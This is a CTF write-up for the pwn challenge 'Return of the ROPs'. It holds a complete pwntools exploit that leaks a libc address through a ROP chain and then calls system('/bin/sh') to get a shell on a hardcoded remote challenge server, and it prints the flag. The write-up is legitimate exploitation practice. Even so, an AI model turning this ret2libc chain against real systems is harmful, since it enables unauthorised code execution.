## 0x41414141 CTF: Return of the ROPs [pwn]
> Is ROP dead? God no. But it returns from a long awaited time, this time in a weird fashion. Three instructions ... can you pwn it?

##### *tl;dr: simple rop but need to place extra returns to avoid movaps sigsev issue (unintended solution?)*
#### buffer overflow + format string vulns but I only did the standard leak + ret2system method, but it seems from the flag that it wasn't the intended way of solving it. Maybe I'll try solving it later using ret2csu.

```python
from pwn import *
import hashlib
#: CONNECT TO ret-of-the-ropsENGE SERVERS
binary = ELF('./ret-of-the-rops', checksec = False)
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so', checksec = False)

#p = process('./ret-of-the-rops')
#: p = process('./ret-of-the-rops', env = {'LD_PRELOAD' : './libc.so'})
p = remote("185.172.165.118", 2222)

#: GDB SETTINGS
breakpoints = ['break *0x4011f7']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: EXPLOIT INTERACTION STUFF
fmt_offset = 6
ret = 0x000000000040101a
pop_rdi = 0x0000000000401263

#: send PoW first
target_hash = p.recvuntil('\n').split(' = ')[1].strip()
print(target_hash)
for c1 in range(97, 122):
	for c2 in range(97, 122):
		for c3 in range(97, 122):
			for c4 in range(97, 122):

				md5 = hashlib.md5()
				pow_string = chr(c1) + chr(c2) + chr(c3) + chr(c4)
				md5.update(pow_string)

				if md5.hexdigest()[-6:] == target_hash:
					p.sendline(pow_string)
					break

#: PWN THY VULNS
print(p.recvuntil('say?\n'))

exploit = cyclic(40)
exploit += p64(pop_rdi) #: DONT ADD A RET TO AVOID THE MOVAPS STACK ALIGNMENT ISSUE
exploit += p64(binary.got['gets'])
exploit += p64(binary.symbols['puts'])
exploit += p64(binary.symbols['main'])

p.sendline(exploit)
leak = u64(p.recvuntil('\n').split()[0][43:].ljust(8,'\x00'))
print(hex(leak))

libc_base = leak - libc.symbols['gets']
print(hex(libc_base))
print(p.recvuntil('say?\n'))

#: STAGE 2
exploit = cyclic(40)
exploit += p64(ret)
exploit += p64(pop_rdi)
exploit += p64(libc_base + libc.search('/bin/sh').next())
exploit += p64(libc_base + libc.symbols['system'])
p.sendline(exploit)
p.interactive()

#: flag{w3_d0n't_n33d_n0_rdx_g4dg3t,ret2csu_15_d3_w4y_7821243}
```